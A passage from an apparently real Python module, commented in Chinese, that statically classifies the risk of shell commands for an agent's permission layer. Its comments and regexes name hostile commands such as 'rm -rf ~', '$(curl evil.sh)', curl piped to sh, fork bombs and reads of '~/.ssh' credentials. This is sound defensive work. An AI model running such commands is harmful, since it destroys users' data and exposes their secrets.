"""Shell 命令的静态风险分析。

为什么不能只用正则匹配 ``rm -rf``？因为同一个危险动作有无数种写法：
``ls && rm -rf ~``、``echo x | sh``、``$(curl evil.sh)``、``python -c "import shutil;..."``、
``find . -delete``……所以这里做三件事：

1. **词法切分**：先按 bash 的规则把 shlex 不认识的命令边界改写出来（引号外的换行、词首的 ``#`` 注释、续行、
   here-document 正文，见 ``_bash_lines``），再用 ``shlex``（尊重引号）切成 token，按 ``&& || ; | & |&`` 等拆成若干段；
2. **逐段分级**：先剥掉包装命令（``env`` / ``timeout`` / ``nice`` / ``xargs`` / ``sudo`` ……只是“换个方式执行
   同一条命令”），再按“真正执行的命令名 + 关键参数”归入 read / write / external / dangerous；
   ``sh -c '...'`` / ``eval`` 的字符串会被 **递归分析**；
3. **整体取最大**：复合命令的风险 = 各段风险的最大值；含命令替换、解释器内联代码等
   **无法静态分析** 的结构时，直接按 external 处理（宁可多问一次，也不放过）；
4. **工作区边界**：参数里出现工作区之外的绝对路径（含 ``~``、``$HOME``），即使命令本身只读也要确认——
   ``cat ~/.bashrc`` 读到的内容会进入上下文、轨迹与日志；
5. **灾难性命令**（删根目录/家目录、格式化磁盘、写块设备、fork 炸弹）单独标记 ``catastrophic``：
   权限层在 **任何模式** 下都直接拒绝，bypass 也不例外；
6. **凭证位置**（``~/.ssh``、``~/.kube``、``$KUBECONFIG`` ……，清单在 ``policy/sensitive.py``）单独标记 ``credential``，
   同样在任何模式下拒绝。匹配看两种样子：原始命令串（``sh -c`` 字符串、heredoc 里的也算），以及 shell 去掉引号、
   展开花括号之后的每个词（``~/.k''ube/config``、``~/.ku{be,}/config``）；
7. **符号链接**：传入 workspace 时，参数按真实路径再判一次（glob 按 bash 规则展开）——工作区里的 ``notes.txt``
   可能是指向 ``~/.ssh/id_rsa`` 的链接；
8. **劫持执行的写法**：“只读”命令的执行型 / 写入型选项（``rg --pre``、``awk -f``、``uniq 输入 输出``）、
   改变后续命令实际执行什么的环境变量（``PATH=.``、``LD_PRELOAD=``、``HOME=``、``GIT_*``）都不按只读放行。

这仍然不是安全边界——真正的兜底是沙箱。它的价值是让“默认放行”的范围尽量精确，降低审批疲劳。
"""

from __future__ import annotations

import functools
import glob
import itertools
import os
import re
import shlex
from dataclasses import dataclass, field

from .sensitive import CREDENTIAL_HINTS, SECRET_HINTS, sensitivity  # 与文件工具的托管基线共用一份敏感路径清单

LEVELS = ("read", "write", "external", "dangerous")
_RANK = {lvl: i for i, lvl in enumerate(LEVELS)}

READ_CMDS = {
    "ls", "cat", "head", "tail", "wc", "grep", "rg", "ag", "pwd", "echo", "printf", "which", "whoami",
    "date", "env", "printenv", "file", "stat", "du", "df", "tree", "less", "more", "sort", "uniq", "cut",
    "tr", "diff", "cmp", "md5sum", "sha256sum", "basename", "dirname", "realpath", "jq", "true", "false",
    "test", "[", "uname", "hostname", "ps", "id", "type", "column", "nl", "seq", "sleep",
}
WRITE_CMDS = {
    "mkdir", "touch", "cp", "mv", "ln", "chmod", "tee", "rmdir", "rm", "patch", "tar", "unzip", "zip",
    "gzip", "gunzip", "make", "cmake", "pytest", "go", "cargo", "mvn", "gradle", "black", "ruff", "prettier",
    "eslint", "tsc", "sed", "awk", "perl", "python", "python3", "node", "npm", "pnpm", "yarn", "uv", "pip",
    "pip3", "poetry", "bun", "deno", "java", "javac", "gcc", "clang",
}
EXTERNAL_CMDS = {"curl", "wget", "ssh", "scp", "rsync", "nc", "telnet", "ftp", "docker", "kubectl", "helm", "terraform", "aws", "gcloud", "az", "gh"}
DANGEROUS_CMDS = {"sudo", "su", "mkfs", "dd", "shutdown", "reboot", "halt", "fdisk", "mount", "umount", "chown", "killall", "crontab", "systemctl", "launchctl"}
INTERPRETERS = {"python", "python3", "node", "bash", "sh", "zsh", "perl", "ruby", "php", "deno", "bun"}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh"}
# 包装命令：真正执行的是后面那条命令。值为“带一个参数值的选项”
WRAPPERS: dict[str, set[str]] = {
    "env": {"-u", "--unset", "-C", "--chdir"}, "nice": {"-n", "--adjustment"}, "ionice": {"-c", "-n", "-t"},
    "nohup": set(), "time": set(), "command": set(), "exec": {"-a"}, "stdbuf": {"-i", "-o", "-e"},
    "timeout": {"-s", "--signal", "-k", "--kill-after"}, "xargs": {"-I", "-n", "-P", "-L", "-d", "-s", "-E", "-a"},
    "sudo": {"-u", "-g", "-C", "-D", "-h", "-p", "-U"}, "doas": {"-u", "-C"}, "caffeinate": {"-t", "-w"},
    "builtin": set(), "coproc": set(), "setsid": set(), "unbuffer": set(), "chronic": set(),
}
# 只影响输出格式的环境变量（语言、时区、颜色、终端尺寸）。其余变量都可能改变“实际执行什么”：
# PATH=. 让 ls 执行工作区里的 ./ls，LD_PRELOAD / DYLD_* 注入动态库，HOME / XDG_CONFIG_HOME / GIT_* 换掉 git 读的配置
# （core.fsmonitor 在 git status 时执行命令），RIPGREP_CONFIG_PATH 给 rg 塞 --pre，PYTHONWARNINGS 会导入模块……
# 名单列不完，所以反过来只放行这一小撮
BENIGN_ENV = re.compile(
    r"LANG|LANGUAGE|LC_[A-Z]+|TZ|TERM|COLUMNS|LINES|NO_COLOR|FORCE_COLOR|CLICOLOR(_FORCE)?|COLORTERM|CI"
    r"|TIME_STYLE|POSIXLY_CORRECT|SOURCE_DATE_EPOCH|PYTHONUNBUFFERED|PYTHONDONTWRITEBYTECODE|PYTHONIOENCODING"
    r"|PYTHONHASHSEED|RUST_BACKTRACE|NODE_ENV|CARGO_TERM_COLOR")
# git -c / --config-env 只放行这些无害的键；其余的键可能指定外部程序（core.fsmonitor、diff.external、*.textconv、
# filter.*、credential.helper ……）或引入别的配置文件（include.path）
GIT_SAFE_CONFIG = re.compile(
    r"color\.[\w.-]+|core\.(quotepath|abbrev|autocrlf|safecrlf|filemode|ignorecase|precomposeunicode)|i18n\.\w+"
    r"|log\.(date|decorate|abbrevcommit|follow|mailmap|showroot)|column\.\w+|advice\.\w+|user\.(name|email)"
    r"|init\.defaultbranch|diff\.(noprefix|mnemonicprefix|renames|algorithm|context|interhunkcontext|relative|indentheuristic)"
    r"|status\.(short|branch|showuntrackedfiles|relativepaths|aheadbehind|renames|showstash)|merge\.conflictstyle"
    r"|grep\.(linenumber|column|patterntype|extendedregexp|fullname)|(tag|branch)\.sort|versionsort\.\w+|push\.default",
    re.I)
# 复合命令的保留字：``if rm -rf ~; then ...``、``{ rm -rf ~; }`` 里真正执行的是保留字后面的命令
RESERVED = {"!", "{", "}", "if", "then", "elif", "else", "fi", "while", "until", "do", "done", "esac"}
# 命令分隔符。shlex 会把相邻的标点并成一个 token（``ls;(rm -rf ~)`` 里的 ``;(``），先按 bash 的运算符拆开再判断
SEPARATORS = {";", "&&", "||", "|", "&", "|&", ";;", ";&", ";;&", "(", ")"}
_OPERATOR = re.compile(r";;&|;;|;&|\|\||\|&|&&|&>>|&>|>>|>\||>&|<<<|<<-|<<|<&|<>|[;&|()<>]")
SAFE_ABS = {"/dev/null", "/dev/stdin", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/urandom", "/dev/random"}
# 写文件的重定向：>&、<& 后面跟数字或 - 是复制/关闭文件描述符（2>&1），跟文件名就是写文件；<> 以读写方式打开，不存在就创建
REDIRECTS = {">", ">>", ">|", "&>", "&>>", "<>", ">&"}
_ASSIGN = re.compile(r"[A-Za-z_][A-Za-z0-9_]*\+?=.*")
_GLOB_CHARS = re.compile(r"[*?\[]")
_GLOB_LIMIT = 64
_DURATION = re.compile(r"\d+(\.\d+)?[smhd]?")
_HOME = ("~", "$HOME", "${HOME}")
# $( ... )（允许一层嵌套括号）、反引号、<( ... ) / >( ... )
_SUBST = re.compile(r"\$\(((?:[^()]|\([^()]*\))*)\)|`([^`]*)`|[<>]\(((?:[^()]|\([^()]*\))*)\)")
_BLOCK_DEV = re.compile(r"/dev/(r?disk|sd|nvme|hd|xvd|mmcblk|vd|md|dm-|mapper/)")
_VAR_HEAD = re.compile(r"\$(?:\{(\w+)\}|(\w+))")       # 以变量开头的词：$D/passwd、${D}x/passwd
_BRACE_RANGE = re.compile(r"(-?\d+)\.\.(-?\d+)|([A-Za-z])\.\.([A-Za-z])")
_BRACE_LIMIT = 64                                      # 展开结果的上限：{a,b}{a,b}…… 会指数膨胀

GIT_READ = {"status", "log", "diff", "show", "rev-parse", "ls-files", "blame", "describe", "shortlog", "ls-tree",
            "cat-file", "merge-base", "rev-list", "show-ref", "for-each-ref", "count-objects", "check-ignore", "name-rev",
            "version", "grep"}
GIT_EXTERNAL = {"push", "fetch", "pull", "clone", "ls-remote"}
# branch / tag：(会改动引用的选项, 进入“列出”模式的选项)。两者都没有、却带着位置参数时，位置参数是要新建的分支或标签名。
# 同一个字母在两个命令里意思不同：branch -a 是列出全部，tag -a 是建附注标签；branch -v 是详细列表，tag -v 是校验签名
_GIT_REFS = {
    "branch": ({"-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy", "-f", "--force", "-u",
                "--set-upstream-to", "--unset-upstream", "--edit-description", "-t", "--track", "--no-track",
                "--create-reflog", "--recurse-submodules"},
               {"-l", "--list", "--contains", "--no-contains", "--merged", "--no-merged", "--points-at", "-v",
                "--verbose", "-a", "--all", "-r", "--remotes", "--show-current"}),
    "tag": ({"-a", "--annotate", "-s", "--sign", "-u", "--local-user", "-f", "--force", "-d", "--delete", "-m",
             "--message", "-F", "--file", "-e", "--edit", "--cleanup", "--trailer", "--create-reflog", "-v", "--verify"},
            {"-l", "--list", "-n", "--contains", "--no-contains", "--merged", "--no-merged", "--points-at"}),
}
# 能在 rm / dd / mkfs 之前再套一层的未知命令（taskset 1 rm -rf ~、strace -f rm -rf ~、uv run rm -rf ~）：
# 从这些命令名开始的参数按一条独立命令再分析一遍，只采纳“灾难性”结论
_CATASTROPHE_HEADS = {"rm", "dd", "chmod", "chown", "find", "eval", "sudo", "doas", "xargs", "env", *SHELLS}
NET_INSTALL = {("npm", "install"), ("npm", "i"), ("pnpm", "install"), ("pnpm", "add"), ("yarn", "add"), ("pip", "install"),
               ("pip3", "install"), ("uv", "add"), ("uv", "pip"), ("cargo", "install"), ("go", "get"), ("npm", "publish")}


@dataclass
class CommandAnalysis:
    command: str
    segments: list[str] = field(default_factory=list)
    level: str = "read"
    reasons: list[str] = field(default_factory=list)
    catastrophic: bool = False   # 无论什么模式都必须拒绝的命令
    catastrophic_reason: str = ""
    credential: bool = False     # 碰到凭证位置：同样无论什么模式都拒绝
    credential_reason: str = ""
    network: bool = False        # 会从网络取回内容（curl、git pull……）：输出不可信，标记污点
    # 实际执行的命令不在命令文本里：命令替换 / 进程替换藏在另一条命令的参数中，仓库配置定义的 git 驱动根本不在命令里——
    # allow 规则按前缀匹配时看不见它们
    opaque: bool = False
    # 命令里嵌着另一段要执行的代码（sh -c、eval、find -exec、解释器内联代码……）：前几个词说明不了实际执行什么，
    # “本会话总是允许”只能精确授权这一条，不能按前缀放行
    inline: bool = False
    workspace: str | None = field(default=None, repr=False)
    depth: int = field(default=0, repr=False)   # sh -c / eval 的递归深度

    def bump(self, level: str, reason: str) -> None:
        """提升风险等级。决定最终等级的原因排在最前面（reasons[0] 就是“为什么这么判”）。"""
        if reason in self.reasons:
            return
        if _RANK[level] > _RANK[self.level] or not self.reasons:
            self.level = max(self.level, level, key=lambda x: _RANK[x])
            self.reasons.insert(0, reason)
        else:
            self.reasons.append(reason)

    def flag_catastrophic(self, reason: str) -> None:
        self.bump("dangerous", reason)
        if not self.catastrophic:
            self.catastrophic, self.catastrophic_reason = True, reason

    def flag_credential(self, reason: str) -> None:
        self.bump("dangerous", reason)
        if not self.credential:
            self.credential, self.credential_reason = True, reason

    @property
    def rank(self) -> int:
        return _RANK[self.level]


def analyze(command: str, workspace: str | None = None, *, _depth: int = 0) -> CommandAnalysis:
    """分析命令风险。传入 workspace 时，指向工作区内部的绝对路径按工作区内路径处理。"""
    a = CommandAnalysis(command=command, workspace=workspace, depth=_depth)
    if workspace:
        # 工作区根目录本身（ls /ws）和它下面的路径（cat /ws/app.py、>/ws/out、@/ws/body.json）都换成相对写法。
        # 前后都用白名单：后面只能是 / 、空白、命令分隔符或结尾——/ws*、/ws{,-other}、"/ws"-other、/ws$X 经 shell 展开后
        # 会落到工作区外，改写成 . 就成了绕过；/ws-other、/x/ws/y 这类只是字符串沾边的路径同样保持原样（按越界处理）
        root = re.escape(workspace.rstrip("/"))
        command = re.sub(rf"(?<![^\s=:'\"(<>@;|&]){root}(?=[/\s;&|<>)]|$)", ".", command)
    # 替换语法的检测直接作用于原始命令，不先“剔除单引号内容”：引号的语义依赖上下文
    # （双引号里的单引号只是普通字符，$( ) 里又会开始新的引号上下文），用正则猜引号很容易猜错，
    # 猜错就会放过真正会执行的命令。这里宁可把 echo '$(x)' 这样的字面量也当作不透明——误判的代价只是多问一次
    if "$(" in command or "`" in command:
        a.opaque = True
        a.bump("external", "包含命令替换 $(...) 或反引号，无法静态分析")
    if re.search(r"<\(|>\(", command):
        a.opaque = True
        a.bump("external", "包含进程替换，无法静态分析")
    # 替换里的命令同样会执行（即使写在双引号里）：递归分析，灾难性命令藏在 "$(...)" 里也要识别出来
    for inner in _SUBST.findall(command):
        body = next((x for x in inner if x), "")   # 空的替换（`` 或 $()）展开为空串：没有要分析的命令
        if body.strip():
            _recurse(body, a, "命令替换")
    _check_secrets(command, a)
    if re.search(r":\(\)\s*\{", command):
        a.flag_catastrophic("疑似 fork 炸弹")
    if re.search(r"\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z)?sh\b", command):
        a.bump("dangerous", "下载后直接执行（curl | sh）")

    try:
        lex = shlex.shlex(_bash_lines(command), posix=True, punctuation_chars=";&|<>()")
        lex.whitespace_split = True
        lex.commenters = ""  # shlex 把词中间的 # 也当注释（echo a#b; rm -rf ~ 的后半句会被吞掉）；注释已由 _bash_lines 按 bash 规则去掉
        tokens = list(lex)
    except ValueError as e:  # 引号不配对等
        a.bump("external", f"命令无法解析：{e}")
        return a

    segment: list[str] = []
    for tok in _split_operators(tokens) + [";"]:
        if tok in SEPARATORS:
            if segment:
                a.segments.append(" ".join(segment))
                _classify(segment, a)
                segment = []
            if tok == "&":
                a.bump("write", "后台执行（&）")
            continue
        segment.append(tok)
    return a


def _split_operators(tokens: list[str]) -> list[str]:
    """shlex 把连续的标点并成一个 token：``;(``、``&&(``、``)>``。按 bash 的运算符重新拆开，分隔符才认得出来。"""
    out: list[str] = []
    for tok in tokens:
        if tok and not tok.strip(";&|<>()"):
            out.extend(_OPERATOR.findall(tok))
        else:
            out.append(tok)
    return out


def _bash_lines(cmd: str) -> str:
    """把 bash 认作命令边界、shlex 却看不出来的结构改写成 shlex 认得的样子。

    shlex 把换行当普通空白，bash 却把引号外的换行当命令分隔符：``echo safe⏎touch x`` 在分析器眼里是一条只读 echo，
    执行时却是两条命令。这里按 bash 的规则扫一遍（引号、``$( )``、反引号、``$(( ))`` 分别跟踪上下文）：

    - 引号外的换行 → `` ; ``；``\\``+换行是续行，直接去掉；
    - 词首的 ``#`` 到行尾是注释，去掉（``a#b`` 里的 # 不是注释）；
    - here-document 的正文是喂给命令的数据，不是命令，去掉。找不到结束符时不去掉，正文按命令分析——
      宁可多问，也不能把真正会执行的行当成数据。正文里的凭证路径、``$( )`` 仍由 analyze() 对原始命令串的检查覆盖。

    - ``$'...'``（ANSI-C 引号）按 C 转义解码后换成普通单引号：shlex 不认识它，``$'\\x72m' -rf ~`` 执行的就是 ``rm -rf ~``。

    引号不配对时原样交给 shlex，由它报“无法解析”。
    """
    if "\n" not in cmd and "#" not in cmd and "$'" not in cmd:
        return cmd
    out: list[str] = []
    stack: list[str] = []                      # 上下文：引号 "'"、'"'、"$'"；命令 "`"、"$("、"("；算术 "(("、"a("
    heredocs: list[tuple[str, bool]] = []      # 本行登记的 here-document：(结束符, 是否 <<-)
    i, n = 0, len(cmd)
    while i < n:
        c, top = cmd[i], (stack[-1] if stack else "")
        if top == "'":
            if c == "'":
                stack.pop()
            out.append(c)
            i += 1
            continue
        if top in ('"', "$'", "`") and c == "\\" and i + 1 < n:
            out.append(cmd[i:i + 2])          # 转义的引号不结束字符串
            i += 2
            continue
        if top == "$'":
            if c == "'":
                stack.pop()
            out.append(c)
            i += 1
            continue
        if top == '"':
            if c == '"':
                stack.pop()
            elif cmd.startswith("$(", i):         # 双引号里的 $( ) 重新开始命令上下文（引号也重新配对）
                k = 3 if cmd.startswith("$((", i) else 2
                stack.append("((" if k == 3 else "$(")
                out.append(cmd[i:i + k])
                i += k
                continue
            elif c == "`":
                stack.append("`")
            out.append(c)
            i += 1
            continue
        # ---- 命令上下文：顶层、$( )、( )、反引号、$(( ))
        if top in ("((", "a("):                 # 算术：<< 是移位、# 不是注释，只跟踪括号；换行照样拆开，不让两行粘成一条
            if top == "((" and cmd.startswith("))", i):
                stack.pop()
                out.append("))")
                i += 2
                continue
            if c == "(":
                stack.append("a(")
            elif c == ")" and top == "a(":
                stack.pop()
            out.append(" ; " if c == "\n" else c)
            i += 1
            continue
        if c == "\\" and i + 1 < n:
            if cmd[i + 1] != "\n":                # 续行：反斜杠和换行一起去掉
                out.append(cmd[i:i + 2])
            i += 2
            continue
        if c == "`" and top == "`":
            stack.pop()
        elif c in "'\"`":
            stack.append(c)
        elif cmd.startswith("$'", i):
            j = i + 2
            while j < n and cmd[j] != "'":
                j += 2 if cmd[j] == "\\" else 1
            if j < n:
                out.append(shlex.quote(_ansi_c(cmd[i + 2:j])))
                i = j + 1
                continue
            stack.append("$'")                    # 不配对：留给 shlex 报错
            out.append("$'")
            i += 2
            continue
        elif cmd.startswith(("$((", "(("), i):
            stack.append("((")
            k = 3 if c == "$" else 2
            out.append(cmd[i:i + k])
            i += k
            continue
        elif cmd.startswith("$(", i):
            stack.append("$(")
            out.append("$(")
            i += 2
            continue
        elif c == "(":
            stack.append("(")
        elif c == ")" and top in ("$(", "("):
            stack.pop()
        elif c == "#" and (i == 0 or cmd[i - 1] in " \t\n;&|()<>"):
            while i < n and cmd[i] != "\n":   # 注释：去到行尾，换行留给下面当分隔符
                i += 1
            continue
        elif cmd.startswith("<<", i) and not cmd.startswith("<<<", i):
            j, strip_tabs = i + 2, cmd.startswith("<<-", i)
            j += strip_tabs
            while j < n and cmd[j] in " \t":
                j += 1
            delim, j = _heredoc_word(cmd, j)
            if delim:
                heredocs.append((delim, strip_tabs))
            out.append(cmd[i:j])
            i = j
            continue
        elif c == "\n":
            out.append(" ; ")
            i += 1
            for delim, strip_tabs in heredocs:
                end = _heredoc_end(cmd, i, delim, strip_tabs)
                if end is None:                   # 没有结束符：正文按命令分析
                    break
                i = end
            heredocs.clear()
            continue
        out.append(c)
        i += 1
    return "".join(out)


_ANSI_SIMPLE = {"a": "\a", "b": "\b", "e": "\x1b", "E": "\x1b", "f": "\f", "n": "\n", "r": "\r", "t": "\t", "v": "\v",
                "\\": "\\", "'": "'", '"': '"', "?": "?"}
_ANSI_ESC = re.compile(r"\\(?:([abeEfnrtv\\'\"?])|([0-7]{1,3})|x([0-9a-fA-F]{1,2})|u([0-9a-fA-F]{1,4})|U([0-9a-fA-F]{1,8})|c(.))", re.S)


def _ansi_c(body: str) -> str:
    """按 bash 的规则解码 ``$'...'`` 的正文（\\n、\\xHH、\\uHHHH、八进制、\\e、\\cX……）。
    不认识的转义（\\<、\\.）和 bash 一样保留反斜杠——不借用 Python 的 unicode_escape，它对未知转义的处理会随版本变成报错"""
    def one(m: re.Match) -> str:
        simple, octal, hx, u4, u8, ctl = m.groups()
        if simple:
            return _ANSI_SIMPLE[simple]
        if octal:
            return chr(int(octal, 8) & 0xFF)
        if hx:
            return chr(int(hx, 16))
        if u4 or u8:
            cp = int(u4 or u8, 16)
            return m.group(0) if cp > 0x10FFFF or 0xD800 <= cp <= 0xDFFF else chr(cp)
        return chr(ord(ctl) & 0x1F)
    return _ANSI_ESC.sub(one, body)


def _heredoc_word(cmd: str, j: int) -> tuple[str, int]:
    """读出 ``<<`` 后面的结束符（去掉引号与反斜杠，bash 按去引号后的字面量比较），返回 (结束符, 读到的位置)。"""
    word, quote = [], ""
    while j < len(cmd):
        c = cmd[j]
        if quote:
            if c == quote:
                quote = ""
            else:
                word.append(c)
        elif c in "'\"":
            quote = c
        elif c == "\\" and j + 1 < len(cmd):
            j += 1
            word.append(cmd[j])
        elif c in " \t\n;&|()<>":
            break
        else:
            word.append(c)
        j += 1
    return "".join(word), j


def _heredoc_end(cmd: str, start: int, delim: str, strip_tabs: bool) -> int | None:
    """从 start 起逐行找结束符所在的行，返回它之后的位置；找不到返回 None。"""
    pos = start
    while pos <= len(cmd):
        nl = cmd.find("\n", pos)
        line = cmd[pos:] if nl == -1 else cmd[pos:nl]
        if (line.lstrip("\t") if strip_tabs else line) == delim:
            return len(cmd) if nl == -1 else nl + 1
        if nl == -1:
            return None
        pos = nl + 1
    return None


def _unwrap(words: list[str], a: CommandAnalysis) -> list[str]:
    """剥掉前置赋值、复合命令的保留字与包装命令，返回真正执行的那条命令（可能为空：例如单独的 ``env``、``fi``）。"""
    while words:
        while words and (_ASSIGN.fullmatch(words[0]) or words[0] in RESERVED or words[0] == "function"):
            if _ASSIGN.fullmatch(words[0]):
                _check_assign(words[0], a)
            words = words[2:] if words[0] == "function" else words[1:]  # FOO=bar cmd、then cmd、function f { cmd
        if not words:
            return []
        name = words[0].rsplit("/", 1)[-1]
        if name not in WRAPPERS:
            return words
        rest, takes = words[1:], WRAPPERS[name]
        if name in ("sudo", "doas"):
            a.bump("dangerous", f"{name} 提权执行")
        if name == "xargs":   # find . | xargs cat、cat list.txt | xargs cat：读写的路径是数据，命令串里看不到
            a.bump("external", "xargs 从标准输入取参数，实际读写的路径无法静态判断")
        while rest and (rest[0].startswith("-") or (name == "env" and _ASSIGN.fullmatch(rest[0]))):
            opt = rest.pop(0)
            if _ASSIGN.fullmatch(opt):   # env PATH=. ls
                _check_assign(opt, a)
                continue
            if name == "env" and opt in ("-S", "--split-string") or opt.startswith("--split-string="):
                a.bump("external", "env -S 会把字符串再切分执行，无法静态分析")
                a.inline = True
            val = rest.pop(0) if opt in takes and rest else opt.split("=", 1)[1] if opt.startswith("--") and "=" in opt else ""
            if val and _is_outside(val, a):   # env -C /etc cat passwd、xargs -a /etc/passwd echo：选项值同样是路径
                a.bump("external", f"{name} {opt.split('=')[0]} 访问工作区外路径 {val}")
        if name == "command" and rest[:1] in (["-v"], ["-V"]) or words[1:2] in (["-v"], ["-V"]) and name == "command":
            return ["type"]  # command -v：只是查找命令位置
        if name == "timeout" and rest and _DURATION.fullmatch(rest[0]):
            rest = rest[1:]
        if not rest:
            return [name] if name == "env" else []  # 单独的 env：打印环境变量
        words = rest
    return words


# 值本身就是一条命令的环境变量：GIT_SSH_COMMAND='rm -rf ~' git fetch 执行的就是 rm -rf ~
_CMD_ENV = re.compile(r"GIT_(SSH_COMMAND|EXTERNAL_DIFF|PAGER|EDITOR|SEQUENCE_EDITOR|ASKPASS)|SSH_ASKPASS|PAGER|MANPAGER"
                      r"|EDITOR|VISUAL|LESSOPEN|LESSCLOSE")


def _check_assign(word: str, a: CommandAnalysis) -> None:
    """``NAME=值``（前置赋值、独立赋值、``env NAME=值``、``export NAME=值``）：只有 BENIGN_ENV 里的变量不改变“实际执行什么”。"""
    name, _, value = word.partition("=")
    name = name.rstrip("+")
    if BENIGN_ENV.fullmatch(name):
        return
    a.bump("external", f"设置环境变量 {name}，可能改变命令实际执行的程序或读取的配置（PATH、HOME、LD_PRELOAD、GIT_* 等）")
    if _CMD_ENV.fullmatch(name) and value.strip("|"):
        _recurse(value.lstrip("|"), a, f"环境变量 {name}")


@functools.lru_cache(maxsize=16)
def _realroot(workspace: str) -> str:
    return os.path.realpath(workspace)


def _real_paths(word: str, a: CommandAnalysis) -> list[str]:
    """词在工作区里实际指向的位置：跟随符号链接，glob 按 bash 的规则展开（不含点文件，最多 _GLOB_LIMIT 个）。
    没有工作区、或者词是选项 / 变量 / 绝对路径（交给 _is_outside 按字面判断）时返回空。"""
    if not a.workspace or not word or word.startswith(("-", "$", "~", "/")) or len(word) > 1024 or "\0" in word:
        return []
    root = _realroot(a.workspace)
    names = [word]
    if _GLOB_CHARS.search(word) and word.count("/") <= 4:   # 层数限一下：*/*/*/*/... 会把整个仓库走一遍
        try:
            names = list(itertools.islice(glob.iglob(word, root_dir=root), _GLOB_LIMIT)) or names   # 没匹配到时 bash 原样传参
        except (OSError, ValueError):
            pass
    return [os.path.realpath(os.path.join(root, x)) for x in names]


def _within(real: str, root: str) -> bool:
    return real == root or real.startswith(root.rstrip(os.sep) + os.sep)


def _is_outside(path: str, a: CommandAnalysis) -> bool:
    """工作区内的绝对路径在 analyze() 开头已被替换成 ./ 前缀，这里剩下的绝对路径都在工作区外；
    相对路径用 normpath 判断是否经 .. 爬出了工作区（命令在工作区根目录执行），再按真实路径判断——
    工作区里的符号链接可以指向任何地方。
    以变量开头、又带 / 的词（``$D/passwd``）落在哪里取决于变量的值，按越界处理；``$PWD`` 就是工作区根目录。"""
    if path in SAFE_ABS:
        return False
    m = _VAR_HEAD.match(path)
    if m and "/" in path:
        if (m.group(1) or m.group(2)) != "PWD":
            return True
        path = "." + path[m.end():]
    if path.startswith(("/", *_HOME)):
        return True
    if ".." in path and os.path.normpath(path).split("/", 1)[0] == "..":
        return True
    return any(not _within(real, _realroot(a.workspace)) for real in _real_paths(path, a))


def _check_secrets(text: str, a: CommandAnalysis) -> None:
    m = CREDENTIAL_HINTS.search(text)
    if m:
        a.flag_credential(f"涉及凭证位置 {m.group(0)}")
    elif SECRET_HINTS.search(text):
        a.bump("dangerous", "涉及凭证/密钥路径")


def _check_link(word: str, a: CommandAnalysis) -> None:
    """按真实路径再查一次敏感清单：``cat notes.txt`` 读到的可能是 ``~/.ssh/id_rsa``（工作区里的符号链接）。"""
    val = word.split("=", 1)[1] if word.startswith("-") and "=" in word else word
    for real in _real_paths(val, a):
        level = sensitivity(real)
        if level == "deny":
            a.flag_credential(f"{val} 实际指向凭证位置 {real}")
            return
        if level == "ask":
            a.bump("dangerous", f"{val} 实际指向密钥文件 {real}")


def _expand_braces(word: str) -> tuple[list[str], bool]:
    """bash 的花括号展开（``{a,b}``、``{1..3}``，可嵌套）。返回 (展开结果, 是否完整)；超过上限时不完整。

    shlex 已经去掉了引号，``'{a,b}'`` 这种 shell 不会展开的写法这里也会展开——多判出几个词，只会更保守。"""
    if "{" not in word:
        return [word], True
    if len(word) > 2048 or word.count("{") > 32:
        return [word], False
    done, todo = [], [word]
    while todo:
        if len(done) + len(todo) > _BRACE_LIMIT:
            return done + todo, False
        w = todo.pop(0)          # 按 bash 的顺序展开：{rm,} -rf ~ 的第一个词是 rm
        span = _brace_span(w)
        if span is None:
            done.append(w)
        else:
            i, j, alts = span
            todo.extend(w[:i] + alt + w[j + 1:] for alt in alts)
    return [w for w in done if w] or done, True   # 展开出的空词 bash 会丢掉


def _brace_span(w: str) -> tuple[int, int, list[str]] | None:
    """找出第一组会被展开的花括号：返回 ({ 的位置, 配对的 } 的位置, 各个分支)。``${VAR}`` 与 ``{a}`` 不展开。"""
    start = 0
    while (i := w.find("{", start)) != -1:
        start = i + 1
        if i > 0 and w[i - 1] == "$":
            continue
        depth, commas = 0, []
        for j in range(i, len(w)):
            if w[j] == "{":
                depth += 1
            elif w[j] == "}":
                depth -= 1
                if depth == 0:
                    break
            elif w[j] == "," and depth == 1:
                commas.append(j)
        else:
            continue  # 这个 { 没有配对的 }，按普通字符处理；里面的 {b,c} 仍会展开（bash：{a{b,c} → {ab {ac）
        if commas:
            cuts = [i, *commas, j]
            return i, j, [w[x + 1:y] for x, y in zip(cuts, cuts[1:])]
        m = _BRACE_RANGE.fullmatch(w[i + 1:j])
        if m and m.group(1) is not None:
            lo, hi = int(m.group(1)), int(m.group(2))
            step = 1 if hi >= lo else -1
            return i, j, [str(x) for x in range(lo, hi + step, step)[:_BRACE_LIMIT + 1]]
        if m:
            lo, hi = ord(m.group(3)), ord(m.group(4))
            step = 1 if hi >= lo else -1
            return i, j, [chr(x) for x in range(lo, hi + step, step)]
    return None


def _classify(seg: list[str], a: CommandAnalysis) -> None:
    # 花括号展开发生在命令执行之前、作用于每个词：rm -rf {~,build} 实际执行的是 rm -rf ~ build
    expanded: list[str] = []
    for w in seg:
        words, complete = _expand_braces(w)
        if not complete:
            a.bump("external", "花括号展开的结果过多，无法静态分析")
        expanded.extend(words)
    for w in expanded:
        _check_secrets(w, a)  # 这时看到的是 shell 去掉引号、展开花括号之后的样子：~/.k''ube/config、~/.ku{be,}/config
        _check_link(w, a)     # 再按真实路径查一次：工作区里的符号链接可以指向凭证
    words = _unwrap(expanded, a)
    if not words:
        return
    cmd = words[0].rsplit("/", 1)[-1]
    args = words[1:]

    # 重定向写文件
    redirect_targets: set[int] = set()
    for j, w in enumerate(words):
        if w in REDIRECTS and j + 1 < len(words):
            redirect_targets.add(j + 1)
            target = words[j + 1]
            if target in ("/dev/null", "&1", "&2") or (w == ">&" and (target.isdigit() or target == "-")):
                continue
            if target.startswith("/dev/"):
                if _BLOCK_DEV.match(target):
                    a.flag_catastrophic(f"写入块设备 {target}")
                else:
                    a.bump("dangerous", f"写入设备文件 {target}")
            elif _is_outside(target, a):
                a.bump("external", f"重定向写入工作区外路径 {target}")
            else:
                a.bump("write", f"重定向写入文件 {target}")
    # 工作区边界：参数（含 --opt=/path 的值）里出现工作区外路径；sed / awk 的程序文本不是路径
    programs = _program_args(cmd, args)
    for j, w in enumerate(args, start=1):
        if j in redirect_targets or j - 1 in programs:
            continue
        val = w.split("=", 1)[1] if w.startswith("-") and "=" in w else w
        if _is_outside(val, a):
